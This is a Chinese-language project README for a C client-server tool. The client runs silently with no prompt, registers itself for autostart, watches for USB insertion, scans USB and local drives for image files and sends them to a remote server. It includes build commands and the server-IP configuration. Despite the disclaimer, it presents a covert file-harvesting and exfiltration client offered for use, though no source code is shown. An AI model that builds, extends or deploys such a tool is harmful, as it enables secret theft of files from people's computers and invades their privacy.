# 文件远程传输获取系统（客户端-服务器）
Remote file transfer and retrieval system (client-server)

## 项目概述

这是一个基于C语言实现的跨平台文件传输系统，支持大文件传输、断点重试、设备热插拔检测等功能。客户端自动扫描指定类型文件并按优先级传输，服务器端接收并保存文件。系统设计为高效、稳定的文件传输解决方案，特别适用于需要自动化文件收集和传输的场景。

⚠️ **重要提示：客户端静默运行无提示！**

## 免责声明

⚠️ **请勿用于违法用途**

本项目按"现状"提供，作者或版权所有者不对任何直接、间接、偶然、特殊或后果性损害（包括但不限于数据丢失、利润损失、业务中断等）承担任何责任，无论此类损害是因使用本软件、无法使用本项目，或与项目功能相关的其他行为所导致，也无论责任是基于合同、侵权（包括过失）或其他法律理论。您在使用、修改或分发本项目时需自行承担全部风险。作者不保证项目的适用性、安全性或无误性。您必须确保使用本软件的行为完全符合适用法律和法规。若因违反法律要求导致任何纠纷或责任，作者或版权所有者概不负责。

## 功能特性

### 客户端

- **自动扫描**：支持扫描USB设备、D盘及其他固定驱动器
- **文件过滤**：默认支持PSD/BMP/JPG/PNG等图像格式（可扩展）
- **优先级传输**：传输优先级为 USB大文件 > USB中等文件 > 本地大文件 > 本地中等文件 > 小文件
- **断点重试**：网络中断自动重连，支持指数退避策略
- **设备热插拔**：实时检测U盘插拔事件，自动触发扫描
- **开机自启**：自动注册系统启动项
- **日志记录**：完整传输日志记录
- **大文件支持**：支持4GB+文件传输
- **TCP KeepAlive**：保持连接稳定性

### 服务器

- **多线程处理**：支持并发连接
- **进度显示**：实时显示文件接收进度
- **日志系统**：记录完整传输日志
- **大文件支持**：支持4GB+文件传输
- **ACK确认**：文件接收成功后发送确认
- **窗口化界面**：直观显示传输状态

## 环境要求

- Windows 10/11
- CMake 3.20+
- MinGW-w64（推荐GCC 12.2.0）
- Winsock2 支持

## 编译指南

推荐使用CLion的C11标准直接构建项目！

### 客户端

```bash
cd Client/
mkdir build && cd build
cmake -G "MinGW Makefiles" ..
cmake --build . --config Release
```

### 服务端

```bash
cd Server/
mkdir build && cd build
cmake -G "MinGW Makefiles" ..
cmake --build . --config Release
```

## 配置（使用）说明

### 客户端配置（main.c）

```c
#define SERVER_IP               "服务器IP地址"  // 设置为服务器实际IP地址
#define SERVER_PORT             9000           // 服务器端口，可以自行指定，需确保服务器端口可用
```

### 服务器配置（server.c）

```c
#define PORT 9000                              // 服务器监听端口，请与客户端指定的端口一致
#define SAVE_DIR "D:\\ReceivedFiles"           // 接收到的文件在服务器保存目录，可自行指定
#define LOG_FILE "D:\\server_log.txt"          // 服务器日志文件路径，可自行指定
```

## 使用说明

### 客户端

1. 编译生成untitled.exe
2. 首次运行自动注册开机启动
3. 插入U盘自动触发扫描传输
4. 支持断点续传和自动重试

### 服务器

1. 编译生成FileServer.exe
2. 首次运行自动创建保存目录
3. 窗口化显示传输日志
4. 支持最大256KB日志缓存

## 注意事项

- **路径长度**：支持最大4096字符路径（Windows API限制）
- **文件锁定**：传输过程中请勿修改源文件
- **防火墙设置**：需允许指定的端口通信，服务器防火墙开放指定端口
- **日志轮转**：建议定期清理服务器日志
- **内存要求**：服务器保存目录需有足够磁盘空间
- **文件类型**：默认仅传输特定图像格式，可在代码中扩展支持的文件类型
- **传输优先级**：系统会优先传输USB设备上的大文件

## 技术细节

- 使用Winsock2实现网络通信
- 支持TCP KeepAlive保持连接稳定
- 实现指数退避策略进行重试
- 使用Windows API实现设备热插拔检测
- 多线程并发处理文件传输
- 支持64位文件大小，可传输超过4GB的文件